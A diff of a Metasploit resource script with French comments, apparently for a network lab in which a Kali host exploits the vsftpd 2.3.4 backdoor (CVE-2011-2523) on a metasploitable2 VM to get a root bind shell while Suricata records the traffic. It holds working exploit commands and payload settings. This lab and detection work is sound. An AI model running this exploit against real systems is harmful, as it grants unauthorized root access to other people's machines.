@@ -4,7 +4,16 @@
 # Cible        : metasploitable2 — 10.0.10.30 (zone DMZ)
 # Source       : kali-attacker — 192.168.1.50 (zone WAN)
 # MITRE ATT&CK : T1190 — Exploit Public-Facing Application (Initial Access)
-# Objectif     : shell via backdoor vsftpd (port 6200), flux capturé par Suricata
+# CVE          : CVE-2011-2523 — backdoor implanté dans l'archive vsftpd 2.3.4
+#                (2011-06-30/07-03), déclenché par un nom d'utilisateur
+#                contenant ":)", ouverture d'un bind shell root sur port 6200
+# Objectif     : shell root via backdoor vsftpd, flux capturé par Suricata
+# Prérequis pfSense : règles WAN->DMZ additionnelles requises au-delà du port 21 :
+#                - metasploitable:6200/tcp (accès direct au backdoor natif)
+#                - metasploitable:6201/tcp (bind shell utilisé par le payload
+#                  Metasploit cmd/unix/bind_netcat)
+#                Note : DMZ->WAN reste bloqué (egress filtering), d'où le choix
+#                d'un payload bind plutôt que reverse.
 # Usage        : msfconsole -r attack.rc
 # ============================================================
 
@@ -14,6 +23,9 @@ use exploit/unix/ftp/vsftpd_234_backdoor
 show options
 set RHOSTS 10.0.10.30
 set RPORT 21
+set PAYLOAD cmd/unix/bind_netcat
+set RHOST 10.0.10.30
+set LPORT 6201
 run
 
 sessions -l
